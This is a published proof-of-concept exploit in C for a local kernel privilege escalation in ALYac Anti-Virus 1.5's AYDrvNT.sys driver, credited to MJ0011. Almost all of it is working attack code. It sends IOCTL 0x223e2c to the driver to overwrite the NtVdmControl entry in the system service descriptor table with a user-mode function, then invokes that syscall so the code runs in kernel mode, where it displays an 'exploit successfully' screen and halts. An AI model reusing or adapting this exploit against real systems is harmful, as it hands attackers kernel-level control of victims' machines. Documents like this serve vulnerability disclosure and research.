//ESTsoft ALYac Anti-Virus 1.5  with  AYDrvNT.sys  <= 5.0.1.2
//Local Kernel Mode Privilege Escalation Vulnerability

//AUTHOR
//MJ0011

//EMAIL
//th_decoder$126.com

//VULNERABLE PRODUCTS
//ALYac Anti-Virus 1.5

//DETAILS:
//AYDrvNT.sys create a device called "AYDrvNT_ALYAC" , and handles the device io control code = 0x223e2c , which can overwrite the system service descriptor //table entry with arbitrary address.


// EXPLOIT CODE:
// Alyac 0day.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include "malloc.h"
PVOID GetInfoTable(ULONG ATableType)
{
ULONG mSize = 0x4000;
PVOID mPtr = NULL;
LONG status;
HMODULE hlib = GetModuleHandle("ntdll.dll");
PVOID pZwQuerySystemInformation = GetProcAddress(hlib , "ZwQuerySystemInformation");

do
{
mPtr = malloc(mSize);
if (mPtr)
{
__asm
{
push 0
push mSize
push mPtr
push ATableType
call pZwQuerySystemInformation
mov status , eax
}
}
else
{
return NULL;
}
if (status == 0xc0000004)
{
free(mPtr);
mSize = mSize * 2;
}
} while (status == 0xc0000004);
if (status == 0)
{
return mPtr;
}
free(mPtr);
return NULL;
}
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Information[ 1 ];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
enum { SystemModuleInformation = 11,
SystemHandleInformation = 16 };
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
typedef VOID (WINAPI *PINBV_ACQUIRE_DISPLAY_OWNERSHIP)(VOID);
typedef BOOLEAN (WINAPI *PINBV_RESET_DISPLAY)(VOID);
typedef VOID (WINAPI *PINBV_SOLID_COLOR_FILL)(
  ULONG x1,
  ULONG y1,
  ULONG x2,
  ULONG y2,
  ULONG color
    );
typedef ULONG (WINAPI *PINBV_SET_TEXT_COLOR)(
  ULONG Color
    );
typedef
VOID
(*INBV_DISPLAY_STRING_FILTER)(
  PUCHAR *Str
    );
typedef VOID (WINAPI *PINBV_INSTALL_DISPLAY_STRING_FILTER)(
    INBV_DISPLAY_STRING_FILTER DisplayStringFilter
    );
typedef BOOLEAN (WINAPI *PINBV_ENABLE_DISPLAY_STRING)(
    BOOLEAN bEnable
    );
typedef VOID (WINAPI *PINVB_SET_SCROLL_REGION)(
    ULONG x1,
    ULONG y1,
    ULONG x2,
    ULONG y2
    );
typedef VOID (WINAPI *PINBV_DISPLAY_STRING)(
    PUCHAR Str
    );
PINBV_ACQUIRE_DISPLAY_OWNERSHIP InbvAcquireDisplayOwnership = 0 ; 
PINBV_RESET_DISPLAY InbvResetDisplay = 0 ; 
PINBV_SOLID_COLOR_FILL InbvSolidColorFill = 0 ; 
PINBV_SET_TEXT_COLOR InbvSetTextColor = 0 ; 
PINBV_INSTALL_DISPLAY_STRING_FILTER InbvInstallDisplayStringFilter = 0 ; 
PINBV_ENABLE_DISPLAY_STRING InbvEnableDisplayString = 0 ; 
PINVB_SET_SCROLL_REGION InbvSetScrollRegion = 0 ; 
PINBV_DISPLAY_STRING InbvDisplayString= 0 ; 
#define VGA_COLOR_BLACK 0
#define VGA_COLOR_RED 1
#define VGA_COLOR_GREEN 2
#define VGA_COLOR_GR 3
#define VGA_COLOR_BULE 4
#define VGA_COLOR_DARK_MEGAENTA 5
#define VGA_COLOR_TURQUOISE 6
#define VGA_COLOR_GRAY 7
#define VGA_COLOR_BRIGHT_GRAY 8
#define VGA_COLOR_BRIGHT_RED 9
#define VGA_COLOR_BRIGHT_GREEN 10
#define VGA_COLOR_BRIGHT_YELLOW 11
#define VGA_COLOR_BRIGHT_BULE 12
#define VGA_COLOR_BRIGHT_PURPLE 13
#define VGA_COLOR_BRIGHT_TURQUOISE 14
#define VGA_COLOR_WHITE 15
UCHAR DisplayString[] = 
"                                                                                "

"                                                                                "

"                                                                                "

"                ---- ===== EXPLOIT SUCCESSFULLY ==== ----                       "

"                                                                                "

"                                                                                "

" ALYac Anti-Virus v1.5 Local Privilege Escalation Exploit                       "

"                                                                                "

" VULNERABLE PRODUCT                                                             "

"                                                                                "

" ALYac Anti-Virus v1.5                                                          "

"                                                                                "

"                                                                                "

" VULERABLE FILE                                                                 "

" ALDrvNT.sys <= 5.0.1.2                                                         "

"                                                                                "

" AUTHOR                                                                         "

"                                                                                "

" MJ0011                                                                         "

" th_decoder$126.com                                                             "

"                                                                                "

" 2010-9-7                                                                       "

"                                                                                "

"                                                                                "

"                                                                                ";

VOID InbvShellCode()
{
//DISABLE INTERRUPT
__asm
{
cli
}
//RESET TO VGA MODE
InbvAcquireDisplayOwnership();
InbvResetDisplay();
//FILL FULL SCREEN
InbvSolidColorFill(0 , 0 , 639 , 479 ,VGA_COLOR_BLACK);
//SET TEXT COLOR
InbvSetTextColor(VGA_COLOR_BRIGHT_GREEN);
InbvInstallDisplayStringFilter(NULL);
InbvEnableDisplayString(TRUE);
InbvSetScrollRegion( 0 , 0 , 639 ,477);
InbvDisplayString(DisplayString);
while(TRUE)
{
};
}
BOOL InbvInit(PVOID ntosbase , PSTR ntosname)
{
HMODULE hlib = LoadLibrary(ntosname);
if (hlib == NULL)
{
return FALSE ; 
}
InbvAcquireDisplayOwnership = (PINBV_ACQUIRE_DISPLAY_OWNERSHIP)((ULONG)GetProcAddress(hlib , "InbvAcquireDisplayOwnership") - (ULONG)hlib + (ULONG)ntosbase);

InbvResetDisplay = (PINBV_RESET_DISPLAY)((ULONG)GetProcAddress(hlib , "InbvResetDisplay") - (ULONG)hlib + (ULONG)ntosbase);

InbvSolidColorFill = (PINBV_SOLID_COLOR_FILL)((ULONG)GetProcAddress(hlib , "InbvSolidColorFill") - (ULONG)hlib + (ULONG)ntosbase);

InbvSetTextColor = (PINBV_SET_TEXT_COLOR)((ULONG)GetProcAddress(hlib , "InbvSetTextColor") - (ULONG)hlib + (ULONG)ntosbase);

InbvInstallDisplayStringFilter = (PINBV_INSTALL_DISPLAY_STRING_FILTER)((ULONG)GetProcAddress(hlib , "InbvInstallDisplayStringFilter") - (ULONG)hlib + (ULONG)ntosbase);

InbvEnableDisplayString = (PINBV_ENABLE_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvEnableDisplayString") - (ULONG)hlib + (ULONG)ntosbase);

InbvSetScrollRegion = (PINVB_SET_SCROLL_REGION)((ULONG)GetProcAddress(hlib , "InbvSetScrollRegion") - (ULONG)hlib + (ULONG)ntosbase);

InbvDisplayString = (PINBV_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvDisplayString") - (ULONG)hlib + (ULONG)ntosbase);

if (InbvAcquireDisplayOwnership &&
InbvResetDisplay &&
InbvSolidColorFill &&
InbvSetTextColor &&
InbvInstallDisplayStringFilter &&
InbvEnableDisplayString &&
InbvSetScrollRegion &&
InbvDisplayString)
{
return TRUE ; 
}
return FALSE ; 
}
int main(int argc, char* argv[])
{
printf("ALYac AntiVirus AYDrvNT.sys <= 5.0.1.2\n"
"Local Kernel Mode Privilege Escalation Vulnerability POC\n\n"
"by MJ0011 th_decoder$126.com\n"
"Press Enter....\n"
);
getchar();
PSYSTEM_MODULE_INFORMATION pmi = (PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);

if (!InbvInit(pmi->Module[0].Base , strrchr(pmi->Module[0].ImageName , '\\')+1))
{
printf("cannot init inbv system\n");
return 0 ;
}
HANDLE hdev = CreateFile("\\\\.\\DosAYDrvNT_ALYAC" , 
FILE_READ_ATTRIBUTES , 
FILE_SHARE_READ , 
NULL , 
OPEN_EXISTING , 
0 , 0 );
if (hdev == INVALID_HANDLE_VALUE)
{
printf("cannot open dev %u\n" , GetLastError());
return 0 ; 
}
PVOID p = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtVdmControl");
ULONG idofnvc = *(ULONG*)((ULONG)p + 1);
ULONG buf[2];
buf[0] = idofnvc ; 
buf[1] = (ULONG)InbvShellCode;
ULONG btr ; 
if (!DeviceIoControl(hdev , 0x223E2C , &buf , sizeof(ULONG)*2 , NULL , 0 , &btr , 0 ))

{
printf("dev ctl failed %u\n",GetLastError());
return 0 ; 
}
__asm
{
push 0 
push 0 
call p
}
return 0;
}


      